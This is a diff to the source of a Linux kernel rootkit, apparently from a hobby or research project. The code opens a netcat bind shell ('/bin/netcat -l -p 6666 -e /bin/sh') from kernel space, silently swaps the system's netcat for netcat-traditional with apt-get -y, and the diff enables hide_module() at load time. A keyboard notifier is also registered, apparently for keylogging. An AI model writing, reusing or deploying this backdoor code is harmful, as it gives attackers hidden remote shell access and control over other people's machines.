@@ -127,16 +127,13 @@ static const char* keymap_shift[] =
 
 	/* Start Remote Shell */
 
-	
-
 	void shell_tasklet_fn(unsigned long data){
  		static char *envp[] = {
 		        "HOME=/",
 		        "TERM=linux",
 		        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 		char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL};
-		int ret = 0;
-		ret = call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT);
+		int ret = call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT);
 		#ifdef LOG
 				printk(KERN_ERR  "BACKDOOR start netcat returned  %i\n", ret);
 	    #endif
@@ -155,31 +152,15 @@ static const char* keymap_shift[] =
 		        "TERM=linux",
 		        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-			    /* netcat installed in modern dirstros doesn't support the -e option. Solution install traditional netcat. 
-				(could be done in a mor e elegant fashion by for example downloading the binary. 
-				-> independant of the distro/packet managment tool. 
-				http://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd */
-		        char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL};  // -y allways answer yes
-		        char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat-traditional", NULL};
-			//char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL};
-			//int ret = 0;
-		        call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC);
-		        call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC);
-			
-			
- 			//ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC);
-		    //#ifdef LOG
-			//	printk(KERN_ERR  "BACKDOOR start netcat returned  %i\n", ret);
-			//#endif
+	    /* netcat installed in modern dirstros doesn't support the -e option. Solution install traditional netcat. 
+		(could be done in a mor e elegant fashion by for example downloading the binary. 
+		-> independant of the distro/packet managment tool. 
+		http://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd */
+        char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL};  // -y allways answer yes
+        char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat-traditional", NULL};
 
-		        //ret = call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); // Install netcat-taditional
-			    #ifdef LOG
-					//printk(KERN_ERR  "BACKDOOR install netcat returned  %i\n", ret);
-				#endif
-			    //ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); // Launch netcat the fisrt time
-			    #ifdef LOG
-					//printk(KERN_ERR  "BACKDOOR run netcat returned  %i\n", ret);
-				#endif
+        call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC);
+        call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC);
 	}
 
 	/* End Remote Shell */
@@ -253,7 +234,7 @@ static const char* keymap_shift[] =
 /*BOOTSTRAPING*/
 
 static int __init rootkit_start(void){
-//	hide_module();
+	hide_module();
 	ensure_netcat_version();
 	register_keyboard_notifier(&keyboard_notifier);
 
